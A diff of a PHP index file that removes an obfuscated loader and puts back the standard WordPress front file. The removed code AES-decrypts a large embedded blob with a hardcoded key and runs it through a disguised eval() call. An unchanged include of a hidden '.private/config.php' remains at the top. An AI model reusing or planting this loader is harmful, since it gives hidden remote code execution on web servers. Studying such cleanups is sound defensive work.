@@ -1,75 +1,18 @@
 <?php
 include dirname(__FILE__) . '/.private/config.php';
-class Secure {
-private $masterKey;
-private $iterations = 10000;
-private $cipher = 'aes-256-cbc';
-private $hmacAlgo = 'sha256';
-private $saltLength = 16;
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-public function __construct($masterKey) {
-$this->masterKey = $masterKey;
-}
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-public function decrypt($encrypted) {
-$data = base64_decode($encrypted);
-$salt = substr($data, 0, $this->saltLength);
-$ivLength = openssl_cipher_iv_length($this->cipher);
-$iv = substr($data, $this->saltLength, $ivLength);
-$hmac = substr($data, $this->saltLength + $ivLength, 32);
-$ciphertext = substr($data, $this->saltLength + $ivLength + 32);
-$derivedKeys = $this->deriveKeys($salt);
-$calcHmac = hash_hmac($this->hmacAlgo, $iv . $salt . $ciphertext, $derivedKeys['hmac'], true);
-$decrypted = openssl_decrypt($ciphertext, $this->cipher, $derivedKeys['encryption'], OPENSSL_RAW_DATA, $iv);
-return $decrypted;
-}
-
-private function deriveKeys($salt) {
-$keyMaterial = hash_pbkdf2(
-$this->hmacAlgo,
-$this->masterKey,
-$salt,
-$this->iterations,
-64,
-true
-);
-
-return [
-'encryption' => substr($keyMaterial, 0, 32),
-'hmac' => substr($keyMaterial, 32)
-];
-}
-
-private function verifyHmac($knownHmac, $userHmac) {
-return hash_equals($knownHmac, $userHmac);
-}
-
-public function setIterations($iterations) {
-$this->iterations = (int)$iterations;
-return $this;
-}
-
-public function setCipher($cipher) {
-$this->cipher = $cipher;
-return $this;
-}
-}
-$secure = new Secure('Qs5C1zuGoWs5CuXabJlsscda0iTvagDi');
-$str = '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';
-$decrypted = $secure->decrypt($str);
-$NH8jSSTEH2 = function($uyIyozDcMsW){
-/*SSSzgji7W*/eVaL($uyIyozDcMsW);
-$CSkziE4txfC = "oy3H0NTRdJUYkkpM0r7keZ2zC62TUzUf";
-return $CSkziE4txfC;
-};
-$NH8jSSTEH2($decrypted);
-
-
-session_start();
-if (isset($_SESSION['user'])) {
-  header('Location:  ./views/index.php ');
-  die;
-} else {
-  header('Location:  ./login.php ');
-  die;
-}
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
